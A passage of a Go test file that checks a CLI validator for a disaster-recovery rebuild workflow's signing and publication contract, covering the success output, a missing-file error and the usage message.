	workflowPath := filepath.Join("..", "..", ".github", "workflows", "dr-rebuild.yaml")
	configPath := filepath.Join("..", "..", "ksail.prod.yaml")

	var stdout, stderr bytes.Buffer
	if code := run(workflowPath, configPath, &stdout, &stderr); code != 0 {
		t.Fatalf("run on the real repository failed: code=%d stderr=%s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), "DR publication contract passed.") {
		t.Fatalf("missing success line: %q", stdout.String())
	}

	stdout.Reset()
	stderr.Reset()
	missing := filepath.Join(t.TempDir(), "missing.yaml")
	if code := run(missing, configPath, &stdout, &stderr); code != 1 {
		t.Fatalf("unreadable workflow should exit 1, got %d", code)
	}
	if !strings.Contains(stderr.String(), "read workflow") {
		t.Fatalf("missing read-failure diagnostic: %q", stderr.String())
	}
}

func TestRunCLIRequiresBothPaths(t *testing.T) {
	t.Parallel()

	var stdout, stderr bytes.Buffer
	if code := runCLI([]string{"only-one"}, &stdout, &stderr); code != 2 {
		t.Fatalf("expected usage exit 2, got %d", code)
	}
	if !strings.Contains(stderr.String(), "usage: validate-dr-signing") {
		t.Fatalf("missing usage line: %q", stderr.String())
	}
}
